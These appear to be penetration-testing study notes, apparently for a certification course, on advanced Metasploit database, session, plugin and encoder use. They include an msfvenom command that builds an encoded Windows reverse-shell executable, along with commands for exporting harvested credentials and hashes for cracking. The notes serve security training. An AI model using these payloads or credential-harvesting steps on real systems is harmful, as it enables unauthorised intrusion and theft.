# ADDENDUM 01: Metasploit — Advanced Techniques

## Metasploit Database Integration

### Database Setup
```bash
msfdb init          # Initialize database
msfdb run           # Start Metasploit with database
msfdb status        # Check database status
msfdb reinit        # Reinitialize if issues
```

### Database Commands
```bash
msf6 > db_status                        # Check connection
msf6 > db_import /path/to/scan.xml      # Import Nmap scan (.xml preferred)
msf6 > db_nmap -sS -sV -oA scan IP     # Run Nmap (auto-imports)
msf6 > db_connect user:pass@host/db    # Connect to database
msf6 > db_disconnect                    # Disconnect

# Hosts
msf6 > hosts                            # List all hosts
msf6 > hosts -u                         # Up only
msf6 > hosts -c address,os_name        # Specific columns
msf6 > hosts -R                         # Set RHOSTS from results
msf6 > hosts -o hosts.csv              # Export CSV
msf6 > hosts -S Windows                # Search
msf6 > hosts -a IP -o Windows -n name  # Add/modify host

# Services
msf6 > services                         # All services
msf6 > services -p 445                  # Filter by port
msf6 > services -s smb                  # Filter by name
msf6 > services -R                      # Set RHOSTS from results
msf6 > services -a -p 445 -s smb IP   # Add service

# Credentials
msf6 > creds                            # List all
msf6 > creds -u admin                   # Filter by user
msf6 > creds -p 445                     # Filter by port
msf6 > creds -t hash                    # Filter by type
msf6 > creds -P password123            # Filter by password string
msf6 > creds -o creds.csv              # Export CSV
msf6 > creds -j                         # Export JTR format (bf, bsdi, des, md5, sha256, sha512, mssql, mysql, oracle, postgres)
msf6 > creds -H                         # Export Hashcat format

# Loot
msf6 > loot                             # List all
msf6 > loot -t hash                     # Filter by type
msf6 > loot -a -f /path/to/file -t hash -i IP  # Add loot

# Export/Backup
msf6 > db_export -f xml backup.xml      # Export XML
msf6 > db_export -f pwdump hashes.txt  # Export pwdump
```

### Workspace Management
```bash
msf6 > workspace              # List
msf6 > workspace -a target1   # Add
msf6 > workspace target1      # Switch
msf6 > workspace -d target1   # Delete
msf6 > workspace -D           # Delete ALL
msf6 > workspace -r old new   # Rename
msf6 > workspace -v           # Verbose
```

### Global Set (setg)
```bash
msf6 > setg LHOST 10.10.x.x           # Global LHOST
msf6 > setg RHOSTS 10.129.x.x        # Global RHOSTS
msf6 > setg Proxies socks4:127.0.0.1:9050  # Global proxy
# Persists until MSF restart
```

### Advanced Search
```bash
msf6 > search eternalblue -o results.csv   # CSV export
msf6 > search -S meterpreter               # Regex filter
msf6 > search -u eternalblue               # Auto-use if one result
msf6 > search -r -s rank                   # Reverse sort by rank
msf6 > grep meterpreter show payloads      # Grep within msfconsole
msf6 > grep -c meterpreter show payloads   # Count matches
```

**Search columns:** aka, author, arch, bid, cve, edb, check, date, description, fullname, mod_time, name, path, platform, port, rank, ref, reference, target, type

### Sessions & Jobs Management
```bash
# Sessions
msf6 > sessions -l              # List
msf6 > sessions -i 1            # Interact
msf6 > sessions -k 1            # Kill
# Background: [CTRL]+[Z] or type 'background'

# Jobs
msf6 > jobs -l                  # List
msf6 > jobs -K                  # Kill ALL
msf6 > kill 0                   # Kill specific
msf6 > exploit -j               # Run exploit as background job
```

### Plugin System
```bash
# Directory: /usr/share/metasploit-framework/plugins/
msf6 > load <plugin_name>
msf6 > load nessus
msf6 > nessus_connect user:pass@localhost:8834
msf6 > nessus_help

# Key plugins: nessus, nexpose, openvas, sqlmap, wmap
# Community: DarkOperator's Metasploit-Plugins
```

### File System Layout
```
/usr/share/metasploit-framework/
├── Data/           # Wordlists, templates
├── Documentation/  # Guides, API docs
├── Lib/            # Core Ruby libraries
├── Modules/        # Auxiliary, Encoders, Evasion, Exploits, NOPs, Payloads, Post
├── Plugins/        # Ruby plugin files
├── Scripts/        # Meterpreter, PS, Resource, Shell scripts
└── Tools/          # Context, Dev, Exploit, Hardware, Memdump, Modules, Password, Payloads, Recon
```

### Module Naming Convention
`<No.> <type>/<os>/<service>/<name>` — e.g., `exploit/windows/smb/ms17_010_eternalblue`

**Module Types:**
| Type | Purpose | Interactable? |
|------|---------|--------------|
| Auxiliary | Scanning, fuzzing, sniffing, admin | YES (`use <no.>`) |
| Exploit | Vulnerability exploitation | YES (`use <no.>`) |
| Post | Info gathering, pivoting, post-exploitation | YES (`use <no.>`) |
| Encoders | Payload integrity, bad character removal | NO |
| NOPs | Consistent payload sizes | NO |
| Payloads | Callback code | NO |
| Plugins | Additional scripts/framework integration | NO |

### Mixins
Ruby classes that act as methods for other classes without being parent classes. Implemented with `include` keyword. Used for optional features and shared functionality across modules.

### Banner Information
Metasploit banner shows: exploit count, auxiliary count, post count, payload count, encoder count, nop count, evasion count. Changes as modules are added/removed.
```bash
msfconsole -q    # Quiet mode, suppresses banner
```

### Target Types and Return Addresses
Targets vary by: service pack, OS version, language version. Return addresses use `jmp esp`, `pop/pop/ret`. Language packs change addresses. Use `msfpescan` to locate return addresses.

### Encoders Architecture

**Available Encoders:**
| Architecture | Encoders |
|-------------|----------|
| x64 | generic/eicar, generic/none, x64/xor, x64/xor_dynamic, x64/zutto_dekiru |
| x86 | alpha_mixed, alpha_upper, avoid_utf8_tolower, call4_dword_xor, context_cpuid, context_stat, context_time, countdown, fnstenv_mov, jmp_call_additive, nonalpha, nonupper, shikata_ga_nai, single_static_bit, unicode_mixed, unicode_upper |

**Shikata Ga Nai (SGN):**
- "It cannot be helped" — polymorphic XOR additive feedback encoder
- Ranked "excellent"
- **Reality check:** 1 iteration = ~54/69 detected; 10 iterations = ~52/65 detected
- Each iteration increases payload size
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

**Encoder Ranking:** manual < low < normal < excellent

**VirusTotal Integration:** `msf-virustotal` tool (requires free VT registration + API key)

**Key insight:** Encoders do NOT provide meaningful AV evasion against modern defenses. Use proper evasion techniques instead.

### Empire and Cobalt Strike
Professional penetration testing tools for high-value target assessments. Out of scope for CPTS but recommended for research.

### MSF Engagement Structure
Five categories: Enumeration (Service Validation, Vulnerability Research), Preparation (Code Auditing), Exploitation (Module Execution), Privilege Escalation, Post-Exploitation (Pivoting, Data Exfiltration)

### msfupdate Deprecated
Old method was `msfupdate`; now handled by `apt update && apt install metasploit-framework`

### Metasploit Pro vs Framework
Pro features: AV Evasion, IPS/IDS Evasion, Social Engineering, Phishing Wizard, Nexpose Integration, Task Chains, Web Interface, Team Collaboration, Reporting, Evidence Collection, Backup/Restore, Data Export
